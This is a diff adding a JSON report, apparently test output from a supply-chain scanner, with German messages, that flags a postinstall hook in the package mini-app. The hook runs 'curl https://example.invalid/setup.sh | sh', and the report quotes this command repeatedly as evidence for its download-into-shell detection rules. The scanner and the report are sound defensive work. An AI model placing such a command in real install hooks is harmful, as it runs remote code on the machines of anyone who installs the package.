@@ -1,0 +1,113 @@
+{
+  "lockward_version": "0.1.0",
+  "score_version": "score-v1",
+  "heuristics_version": "heuristics-v1",
+  "scanned_at": "2026-10-12T00:00:00Z",
+  "target": "{root}",
+  "lockfile": "{root}//package-lock.json",
+  "project_score": 50,
+  "project_severity": "high",
+  "gate": {
+    "mode": "warn",
+    "outcome": "Warnung",
+    "exit_code": 1
+  },
+  "packages": [
+    {
+      "package_path": "",
+      "name": "mini-app",
+      "version": "1.0.0",
+      "score": 50,
+      "severity": "high",
+      "advisory_points": 0,
+      "heuristic_points": 50,
+      "explanations": [
+        {
+          "source": "LW-H003",
+          "text": "Paket mini-app@1.0.0 Hook `postinstall`: der Hook spricht mit dem Netzwerk oder lädt Daten herunter. Beleg: `curl https://example.invalid/setup.sh | sh`."
+        },
+        {
+          "source": "LW-H004",
+          "text": "Paket mini-app@1.0.0 Hook `postinstall`: der Hook leitet einen Download in eine Shell. Beleg: `curl https://example.invalid/setup.sh | sh`."
+        }
+      ]
+    }
+  ],
+  "violations": [
+    {
+      "rule": "install_scripts",
+      "package_name": "mini-app",
+      "package_version": "1.0.0",
+      "configured_action": "warn",
+      "effective_action": "warn",
+      "message": "Install-Hook `postinstall` in mini-app@1.0.0 ist nicht auf der Allowlist."
+    },
+    {
+      "rule": "no_outbound_build",
+      "package_name": "mini-app",
+      "package_version": "1.0.0",
+      "configured_action": "fail",
+      "effective_action": "warn",
+      "message": "Hook `postinstall` in mini-app@1.0.0 spricht während der Installation mit dem Netzwerk (LW-H003)."
+    },
+    {
+      "rule": "no_outbound_build",
+      "package_name": "mini-app",
+      "package_version": "1.0.0",
+      "configured_action": "fail",
+      "effective_action": "warn",
+      "message": "Hook `postinstall` in mini-app@1.0.0 spricht während der Installation mit dem Netzwerk (LW-H004)."
+    }
+  ],
+  "notes": [
+    "new_dependencies: keine Baseline übergeben, die Regel ist für diesen Lauf inaktiv."
+  ],
+  "hooks": [
+    {
+      "package_name": "mini-app",
+      "package_version": "1.0.0",
+      "package_path": "",
+      "hook": "postinstall",
+      "location": "{root}//package.json#scripts.postinstall",
+      "raw": "curl https://example.invalid/setup.sh | sh",
+      "provenance": "manifest"
+    }
+  ],
+  "heuristics": [
+    {
+      "rule_id": "LW-H003",
+      "description": "Netzwerk-Client oder Download-Werkzeug im Hook",
+      "weight": 15,
+      "package_name": "mini-app",
+      "package_version": "1.0.0",
+      "package_path": "",
+      "hook": "postinstall",
+      "evidence": "curl https://example.invalid/setup.sh | sh",
+      "explanation": "Paket mini-app@1.0.0 Hook `postinstall`: der Hook spricht mit dem Netzwerk oder lädt Daten herunter. Beleg: `curl https://example.invalid/setup.sh | sh`."
+    },
+    {
+      "rule_id": "LW-H004",
+      "description": "Download direkt in eine Shell (curl|sh oder wget|sh)",
+      "weight": 35,
+      "package_name": "mini-app",
+      "package_version": "1.0.0",
+      "package_path": "",
+      "hook": "postinstall",
+      "evidence": "curl https://example.invalid/setup.sh | sh",
+      "explanation": "Paket mini-app@1.0.0 Hook `postinstall`: der Hook leitet einen Download in eine Shell. Beleg: `curl https://example.invalid/setup.sh | sh`."
+    }
+  ],
+  "advisories": {
+    "packages": [
+      {
+        "package_path": "node_modules/left-pad",
+        "name": "left-pad",
+        "version": "1.0.0",
+        "advisories": []
+      }
+    ],
+    "cache_hits": 0,
+    "cache_misses": 1,
+    "offline": true
+  }
+}
